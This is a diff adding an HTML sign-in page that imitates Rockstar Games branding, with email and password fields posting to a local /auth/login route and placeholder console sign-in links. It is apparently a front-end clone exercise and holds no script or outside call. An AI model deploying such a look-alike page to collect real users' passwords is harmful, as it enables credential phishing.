@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <base href="/rockstar/">
+    <meta charset="UTF-8">
+    <title>Sign In - Rockstar Games</title>
+    <link rel="icon" href="images/icon-rockstarShortcut.ico">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="bg"></div>
+
+<div class="logo">
+    <img src="images/icon-mainRockstar.svg" alt="Rockstar logo" class="logo_image">
+</div>
+
+<div class="main_login_wrapper">
+
+    <div class="login">
+        <div class="user-form">
+            <h1 class="heading">Sign In</h1>
+        </div>
+        <form class="login-form" action="/auth/login" method="post">
+            <fieldset class="email_form_set">
+                    <span class="login_form_span">
+                        <input class="login_form_input" type="email" name="email" placeholder="Email" id="email_input">
+                        <label class="login_form_label" for="email_input"></label>
+                    </span>
+            </fieldset>
+            <fieldset class="password_form_set">
+                    <span>
+                        <input type="password" name="password" placeholder="Password" class="password_input" id="password_input">
+                        <label class="password_label" for="password_input"></label>
+                    </span>
+                <div class="keepMeSignIn">
+                        <span class="keepMeSignIn_text">
+                            <input type="checkbox" name="keepMeSignIn" class="keepMeSignIn_input" id="box">
+                            <label for="box">Keep me signed in</label>
+                        </span>
+                </div>
+            </fieldset>
+            <fieldset class="forgot_password_form">
+                <div class="forgot_password">
+                    <p>
+                        <a href="#" class="text_forgot_password">Forgot your password?</a>
+                    </p>
+                    <button type="submit" class="submit_button">
+                        <span>Sign in</span>
+                    </button>
+                </div>
+            </fieldset>
+        </form>
+    </div>
+
+    <div class="container_thirdpartyauth">
+        <fieldset class="login_thirdpartyauth_fieldset">
+            <div class="login_thirdpartyauth_input">
+                <p class="thirdparty_label">Sign in using</p>
+                <div class="thirdparty_services">
+                    <a href="#" class="thirdpartyauth_link_to_Ps">
+                        <img src="images/playstation-game-friends-icon-vector-image-can-also-be-used-social-media-logos-suitable-mobile-apps-web-apps-print-81670099.jpg" alt="ps_icon" class="thirdparty_services_icon_Ps">
+                    </a>
+                    <a href="#" class="thirdpartyauth_link_to_xb">
+                        <img src="images/icon-xbox.png" alt="xbox_icon" class="thirdparty_services_icon_xb">
+                    </a>
+                </div>
+            </div>
+        </fieldset>
+    </div>
+
+    <div class="donthaveacc">
+        <p class="login_createlink">
+            Don't have a Rockstar Games account?
+            <a class="create_new_acc" href="#">Create a new account</a>
+        </p>
+    </div>
+
+</div>
+
+<div class="footer">
+    <ul class="footer_infolist">
+        <li>© 2026 Rockstar Games</li>
+        <li class="footer_info">
+            <button type="button" name="privacyPolicyLink" class="footerPolicyButton">Privacy Policy</button>
+        </li>
+        <li class="footer_info">
+            <button type="button" name="termsAndConditionsLink" class="footerPolicyButton">Terms of Service</button>
+        </li>
+        <li class="footer_info">
+            <button type="button" name="contactUsLink" class="footerPolicyButton">Cookie Settings</button>
+        </li>
+    </ul>
+</div>
+</body>
+</html>
